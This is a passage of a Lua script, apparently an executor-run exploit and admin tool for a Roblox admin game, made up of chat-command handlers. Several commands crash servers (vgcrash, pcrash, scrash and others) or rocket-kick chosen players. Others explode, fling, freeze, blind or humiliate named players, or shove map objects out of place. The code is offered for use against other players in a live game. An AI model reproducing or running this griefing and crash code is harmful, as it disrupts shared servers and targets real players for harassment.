            if #args >= 3 then
                local turner = args[3]
                local daturnings = turnlist[turner]
                if daturnings then
                            for i, code in ipairs(daturnings.name) do
                                    code = replaceArgs2(code, args[2])
                                    Chat(code)
                            end
                       else
                            Remind("Invalid turn chosen.")
                end
            end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'themelist' then
                        Remind("Check your console by running /console!")
                        for i, theme in ipairs(themecode) do
                                    print(i .. " - " .. theme.name .. " - " .. theme.code)
                        end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'gear' then
             local args = string.split(msg, " ")
             if #args >= 3 then
                local target = args[2]
                local gearName = table.concat(args, " ", 3)
                local gearIDs = gearlist[gearName].gearid 
                if type(gearIDs) == "table" then
                            for _, selectedGearID in ipairs(gearIDs) do
                                Chat("gear " .. target .. " " .. selectedGearID)
                            end
                else
                            Chat("gear " .. target .. " " .. gearIDs)
                end
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'song' then
             local args = string.split(msg, " ")
             if #args == 2 then
                local shazam = args[2]
                Playlist(shazam)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'ssong' then
                SkipEvent:Fire()
    end
                
    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'esong' then
                StopEvent:Fire()
    end
                
    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'ggear' then
        local args = string.split(msg, " ")
        if #args >= 3 then
            local target = args[2]
            local gearName = table.concat(args, " ", 3)
            local keyword = game:GetService("HttpService"):UrlEncode(gearName)
            local GearsJSON = game:HttpGet("https://catalog.roblox.com/v1/search/items?category=All&includeNotForSale=true&keyword="..keyword.."&limit=120")
            local GearsDecoded = game:GetService("HttpService"):JSONDecode(GearsJSON)
            if GearsDecoded and GearsDecoded.data then
                for _,v in pairs(GearsDecoded.data) do
                --    print(v.id)
                    local Asset
                    local AssetOk, E = pcall(function() Asset = game:GetService("MarketplaceService"):GetProductInfo(v.id) end)
                    if AssetOk then
                        if Asset.AssetTypeId == Enum.AssetType.Gear.Value then
                            Chat("gear " .. target .. " " .. v.id)
                        end
                    end
                end
            end 
        else
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'char' then
        local args = string.split(msg, " ")
        if #args >= 3 then
                    local target = args[2]
                    local charName = table.concat(args, " ", 3)
                    local china = charlist[charName].charid
                Chat("char " .. target .. " " .. china)
        end
    end



    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'gchar' then
        local args = string.split(msg, " ")
        local target = args[2]
        local specialid = table.concat(args, " ", 3)
        local charpos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
        local circus = game.Players:GetUserIdFromNameAsync(specialid)
        Chat("char " .. target .. " " .. circus);task.wait(0.5)
        if target == "me" then
                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = charpos
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'antiabuse' then
        Remind("Most antis are ON!")
                        antiattach = true
                        antidisco = true
                        antiflash = true
                        antifogend = true
                        antifogstart = true
                        antifogcolor = true
                        antitime = true
                        antiambient = true
                        antibrightness = true
                        antioutamb = true
                        YOUantiblind = true
                        YOUantigs = true
                        YOUantiaddon, ALLantiaddon = true, true
                        YOUanticlone, ALLanticlone = true, true
                        YOUantidog, ALLantidog = true, true
                        YOUantifire, ALLantifire = true, true
                        YOUantifreeze, ALLantifreeze = true, true
                        YOUantifly, ALLantifly = true, true
                        YOUantiff, ALLantiff = true, true
                        YOUantiglow, ALLantiglow = true, true
                        YOUantihealthc, ALLantihealthc = true, true
                        YOUantijail, ALLantijail = true, true
                        YOUantijump, ALLantijump = true, true
                        YOUantikill, ALLantikill = true, true
                        YOUantimsg = true
                        YOUantinoclip = true
                        YOUantiname, ALLantiname = true, true
                        YOUantichar, ALLantichar = true, true
                        YOUantiparticles, ALLantiparticles = true, true
                        YOUantipunish, ALLantipunish = true, true
                        YOUantirocket, ALLantirocket = true, true
                        YOUantisit, ALLantisit = true, true
                        YOUantiseizure, ALLantiseizure = true, true
                        YOUantismoke, ALLantismoke = true, true
                        YOUantisparkles, ALLantisparkles = true, true
                        YOUantispeed, ALLantispeed = true, true
                        YOUantispin, ALLantispin = true, true
                        YOUantistun, ALLantistun = true, true
                        YOUantisetgrav, ALLantisetgrav = true, true
                        YOUantiswag, ALLantiswag = true, true

    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'unantiabuse' then
        Remind("Most antis are OFF!")
                        antiattach = false
                        antidisco = false
                        antiflash = false
                        antifogend = false
                        antifogstart = false
                        antifogcolor = false
                        antitime = false
                        antiambient = false
                        antibrightness = false
                        antioutamb = false
                        YOUantiblind = false
                        YOUantigs = false
                        YOUantiaddon, ALLantiaddon = false, false
                        YOUanticlone, ALLanticlone = false, false
                        YOUantifire, ALLantifire = false, false
                        YOUantifreeze, ALLantifreeze = false, false
                        YOUantifly, ALLantifly = false, false
                        YOUantiff, ALLantiff = false, false
                        YOUantiglow, ALLantiglow = false, false
                        YOUantihealthc, ALLantihealthc = false, false
                        YOUantijail, ALLantijail = false, false
                        YOUantijump, ALLantijump = false, false
                        YOUantikill, ALLantikill = false, false
                        YOUantimsg = false
                        YOUantinoclip = false
                        YOUantiname, ALLantiname = false, false
                        YOUantichar, ALLantichar = false, false
                        YOUantiparticles, ALLantiparticles = false, false
                        YOUantipunish, ALLantipunish = false, false
                        YOUantirocket, ALLantirocket = false, false
                        YOUantisit, ALLantisit = false, false
                        YOUantiseizure, ALLantiseizure = false, false
                        YOUantismoke, ALLantismoke = false, false
                        YOUantisparkles, ALLantisparkles = false, false
                        YOUantispeed, ALLantispeed = false, false
                        YOUantistun, ALLantistun = false, false
                        YOUantisetgrav, ALLantisetgrav = false, false
                        YOUantiswag, ALLantiswag = false, false

    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'bok' then
          bokme = (string.sub(msg:lower(), #prefix + 5))
          SuperCMD("dog "..bokme)
          task.wait(1)
          Chat("explode "..bokme)
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'cgoto' then
           local dasplayer = string.sub(msg:lower(), #prefix + 7)
         PLAYERCHECK(dasplayer)
         if player ~= nil then
                gotou = cplr
                Goto2(gotou)
         else
                Remind('Cannot find player with the name: '..dasplayer)
         end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixbp' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], 2)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movebp' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(game.Workspace.Terrain["_Game"].Workspace["Baseplate"], 1)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'spawnkill' then
                        moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace.Obby.Jump9,CFrame.new(-41.0650024, 1.30000007, -28.601058959961, 0, 0, -1, 0, 1, 0, 1, 0, 0))
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'cagespawn' then
                    moveObject(game:GetService("Workspace").Terrain["_Game"].Workspace["Basic House"].SmoothBlockModel40,CFrame.new(-10.7921638, 17.3182983, -16.0743637, -0.999961913, -0.0085983118, 0.00151610479, -1.01120179e-08, 0.173648253, 0.98480773, -0.00873095356, 0.984770179, -0.173641637))
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'2fixpads' then
        local adminPadCFrames = {CFrame.new(-40.7649879, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-36.7649803, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-32.7649765, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-20.7649632, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-44.7649994, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-12.7649641, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-28.7649689, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-16.7649612, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0),CFrame.new(-24.764967, 1.92999983, 91.8430023, 0, 0, -1, 0, 1, 0, 1, 0, 0)}
            for i,v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetChildren()) do
                moveObject(v.Head,adminPadCFrames[i]*CFrame.new(0,4,0))
                task.wait(0.25)
            end    
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'2fixreg' then
                    moveObject(game:GetService("Workspace").Terrain["_Game"].Admin.Regen,CFrame.new(-7.16500044, 5.42999268, 91.7430038, 0, 0, -1, 0, 1, 0, 1, 0, 0))
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'2fixbp' then
                    moveObject(workspace.Terrain["_Game"].Workspace.Baseplate,CFrame.new(-501, 0.100000001, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1))
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'fcam' then
			FCAM()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixspawn' then
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if Map:FindFirstChild("Spawn1") then
                        moveobject(Map:FindFirstChild("Spawn1"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn2") then
                        moveobject(Map:FindFirstChild("Spawn2"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn3") then
                        moveobject(Map:FindFirstChild("Spawn3"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'movespawn' then
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if Map:FindFirstChild("Spawn1") then
                        moveobject(Map:FindFirstChild("Spawn1"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn2") then
                        moveobject(Map:FindFirstChild("Spawn2"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                task.wait(1)
                if Map:FindFirstChild("Spawn3") then
                        moveobject(Map:FindFirstChild("Spawn3"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixregen' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(Admin.Regen, 2)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'moveregen' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                moveobject(Admin.Regen, 1)
                repeat fwait() until movestatus == false
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'saveregen' then
                Remind("keep your regen co-ords safe!")
                adx, ady, adz = Admin.Regen.Position.X, Admin.Regen.Position.Y, Admin.Regen.Position.Z
                q = adx .. ady .. adz
                print(Admin.Regen.Position.X, Admin.Regen.Position.Y, Admin.Regen.Position.Z)
                setclipboard(q)
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'cusername' then
 		local dasplayer = string.sub(msg:lower(), #prefix + 11)
                PLAYERCHECK(dasplayer)
                if player ~= nil then
        		su = player
			setclipboard(su)
			Remind("Successfully copied the player's username to clipboard.")
                else                        
                        Remind('Cannot find player with the name: '..dasplayer)
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixpads' then        
                if movestatus == true then 
                        return 
                end        
                for i,v in pairs(Pads) do
                        if allclear() == false then break end
                        if v:FindFirstChildOfClass("Part") then
                                v:FindFirstChildOfClass("Part").Name = "Pad" .. tostring(i)
                        end
                end
                DisCol()
                for i,v in ipairs(Pads) do
                        if allclear() == false then break end
                        if v:FindFirstChildOfClass("Part") then
                                v:FindFirstChildOfClass("Part").CanCollide = true
                                moveobject(v:FindFirstChildOfClass("Part"), 2)
                                repeat fwait() until movestatus == false
                                Chat("respawn me")
                                v:FindFirstChildOfClass("Part").CanCollide = false
                        end
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

   if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'movepads' then        
                if movestatus == true then 
                        return 
                end        
                DisCol()
                for i,v in ipairs(Pads) do
                        if allclear() == false then break end
                        if v:FindFirstChildOfClass("Part") then
                                v:FindFirstChildOfClass("Part").CanCollide = true
                                moveobject(v:FindFirstChildOfClass("Part"), 1)
                                repeat fwait() until movestatus == false
                                Chat("respawn me")
                                v:FindFirstChildOfClass("Part").CanCollide = false
                        end
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixfl' then        
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112"), 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movefl' then        
                if movestatus == true then 
                        return 
                end        
                DisCol()
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel38"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel40"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                if game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112") then
                        moveobject(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:FindFirstChild("SmoothBlockModel112"), 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixobby' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'moveobby' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixkb' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

   if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movekb' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'fixobox' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'moveobox' then
                Chat(prefix.."tnok")
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fixadv' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'moveadv' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'fixhouse' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'movehouse' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

  if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'fixbb' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 2)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'movebb' then
                if movestatus == true then 
                        return 
                end
                DisCol()
                for _,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
                        if allclear() == false then break end
                        moveobject(v, 1)
                        repeat fwait() until movestatus == false
                        Chat("respawn me")
                end
                GravFix()
                Chat("respawn me")
                ColFix()
    end        

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'toregen' then
        regentp()
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'lrobb' then
         LocalObby("remove")
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'laobb' then
         LocalObby("add")
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'findregen' then
        regenfind = true
    end

    if string.sub(msg:lower(), 1, #prefix + 11) == prefix..'nofindregen' then
        regenfind = false
    end

    if string.sub(msg:lower(), 1, #prefix + 10) == prefix..'2findregen' then
        regenfind2 = true
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'2nofindregen' then
        regenfind2 = false
    end

    if string.sub(msg:lower(), 1, #prefix + 9) == prefix..'leakedreg' then
        leakedcords()

    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'unpmu' then
        mymusiconly = false
        musicoff = true
        Chat("stopmusic")
        Remind("Perm music is off")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'offmusic' then
        musicoff = true
        Chat("stopmusic")
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'onmusic' then
        musicoff = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'remusic' then
               Chat(prefix.."startm")
     end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'equipall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'actall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                             v:Activate()
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'invall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                local Character = game.Players.LocalPlayer.Character
                for _, v in ipairs(Character:GetChildren()) do
                         if v:IsA("Tool") then
                                    v.Parent = Backpack
                         end
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'dropall' then
                local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
                local Character = game.Players.LocalPlayer.Character
                for _, v in ipairs(Character:GetChildren()) do
                         if v:IsA("Tool") then
                                    v.Parent = Backpack
                         end                
                end
                for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = workspace
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'vgcrash' then
        VGCrash()
    end

   if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'cocrash' then
        CoCrash()
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'emcrash' then
        EmCrash()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'pcrash' then
        PCrash()        
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'fcrash' then
        FCrash()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'dcrash' then
       DCrash()
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'scrash' then -- not a silent crash!
        if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: shield]])
        else
        SCrash()
        end
    end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'rkick' then
        if haspersons == false then
Remind([[Sorry, you don't have Person's to perform this command!
Commands required: rocket]])
        else
                local dasplayer = string.sub(msg:lower(), #prefix + 7)
                   PLAYERCHECK(dasplayer)
                   if player ~= nil and not table.find(nokick, player) then
                        rkickplr(cplr,player)
                        Remind("Rocket kicking "..player)
                elseif table.find(nokick, player) then
                        Remind("Sorry, this player cannot be kicked!")
                else                        
                        Remind('Cannot find player with the name: '..dasplayer)
                   end
        end
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'unrkick' then
                srkick = false
                Remind("Stopped rocket kicking "..player)
		Chat("unrocket/all/all/all")
		Chat("respawn me "..player)
		Chat("removejails")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'welmsg' then
        welcomemsg = true
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'unwelmsg' then
        welcomemsg = false
    end

    if string.sub(msg:lower(), 1, #prefix + 12) == prefix..'clickexplode' then
        clickexplode = true
    end

    if string.sub(msg:lower(), 1, #prefix + 14) == prefix..'unclickexplode' then
        clickexplode = false
    end

    if string.sub(msg:lower(), 1, #prefix + 7) == prefix..'control' then -- really funny ngl
                local dogman = string.sub(msg:lower(), #prefix + 9)
                Chat("speed "..dogman.." 0")
                Chat("dog me "..dogman)
                Chat("tp me "..dogman)
                task.wait(1)
                Chat("punish me "..dogman)
                Chat("undog me "..dogman)
                task.wait(0.25)
                Chat("unpunish me "..dogman)
                Chat("invis me")
                Remind("You should be attached to the player!")
    end

    if string.sub(msg:lower(), 1, #prefix + 8) == prefix..'iceblock' then -- why
                local theblock = string.sub(msg:lower(), #prefix + 10)
                if theblock == "me" then
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame*CFrame.new(0,-40,0)
                end
                task.wait(0.25)
                  Chat("invisible "..theblock); task.wait()
                    Chat("freeze "..theblock);task.wait()
                Chat("size "..theblock.." 10");task.wait()
                Chat("clone "..theblock);task.wait()
                Chat("respawn "..theblock)
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'cube' then -- why
                local imacube = string.sub(msg:lower(), #prefix + 6)
                Chat("unpackage "..imacube)
                for i = 1,15 do
                        task.wait()
                        Chat("size " .. imacube .. " .3")
                    end
                Chat("paint " .. imacube .. " white")
                Chat("bighead " .. imacube)
                Chat("unsize " .. imacube)
                Chat("removelimbs " .. imacube)
                Chat("size " .. imacube .. " 2.5")
                Chat("shiny" .. imacube)
                Remind("The player should now be a cube!")
    end

    if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'over' then -- why
                if bending == true then -- double chat attempted fix but probs won't work
                        return 
                else 
                        bending = true
                        local ucrazy = string.sub(msg:lower(), #prefix + 6)
                        Chat("rocket/"..ucrazy);task.wait(.4)
                        Chat("freeze "..ucrazy)
                        Chat("unrocket/" ..ucrazy);task.wait(.4)
                        Chat("name " .. ucrazy .. " ")
                        Chat("thaw " .. ucrazy)
                        Chat("unseizure " .. ucrazy)
                        Chat("tp " .. ucrazy .. ucrazy)
                        Chat("sit " .. ucrazy)
                        Remind("The player should now be bending!")
                        bending = false
                end
    end

    if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'space' then -- kohls true anti kill
                local person = string.sub(msg:lower(), #prefix + 7)
                Chat("h \n\n\n Guys, we've finally done it! \n\n\n");task.wait(4)
                Chat("h \n\n\n We're sending someone to space! \n\n\n");task.wait(4)
                Chat("h \n\n\n Are we ready? Hopefully our volunteer is too! Here we go! \n\n\n")
                Chat("time 0")
                Chat("rocket/" ..person) -- if they jump then i don't care ngl
                Chat("jail "..person) -- ok maybe i do care
                Chat("spin " ..person);task.wait(4)
                Chat("h \n\n\n LIFT OFF! \n\n\n")
                Chat("unjail "..person)
                Chat("jump " ..person);task.wait(2)
                Chat("explode " ..person);task.wait(2)
                Chat("reload "..person)
                Chat("blind others")
                Chat("h \n\n\n No one saw that, right? \n\n\n");task.wait(4)
                Chat("unblind others")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'heaven' then -- pr
                local person = string.sub(msg:lower(), #prefix + 8)
                Chat("h \n\n\n WOAH, LOOK OVER THERE! THAT GUY'S ASCENDING! \n\n\n")
                Chat("music 9061674082")
                Chat("setgrav "..person.." -256")
                Chat("trip "..person)
                task.wait(0.4)
                Chat("trip "..person)
    end

    if string.sub(msg:lower(), 1, #prefix + 3) == prefix..'bed' then -- ns techno
                local person = string.sub(msg:lower(), #prefix + 5)
                Chat("size "..person.." nan");task.wait()
                Chat("dog "..person.."");task.wait(.2)
                Chat("size "..person.." 2.60");task.wait()
                Chat("paint "..person.." white");task.wait()
                Chat("removelimbs "..person);task.wait(.2)
                Chat("speed "..person.." 24")
                Chat("paint "..person.." white")
                Remind("The player should now be a bed!")
    end

    if string.sub(msg:lower(), 1, #prefix + 6) == prefix..'kitten' then -- nak3d would get tagged
                local meow = string.sub(msg:lower(), #prefix + 8)
                PLAYERCHECK(meow)
                if player ~= nil then
                         kit = cplr
                         if kit and kit.Character and kit.Character.Head then
                                    Chat("paint "..kit.Name.." "..kit.Character.Head.BrickColor.Name)
                                end
                 else
                        Remind('Cannot find player with the name: '..meow)
                 end
    end

   if string.sub(msg:lower(), 1, #prefix + 5) == prefix..'smack' then -- pr
                local person = string.sub(msg:lower(), #prefix + 7)
                Chat("music 5886215922")
                    Chat("speed "..person.." 0")
                    Chat("tp "..person.." me")
                task.wait(0.8)
                Speak("SMACK!")
                    Chat("/e point")
                    Chat("fling "..person)
                task.wait(1.45)
                Chat("explode "..person)
                    Chat("music nan")
    end

   if string.sub(msg:lower(), 1, #prefix + 4) == prefix..'dumb' then -- pr
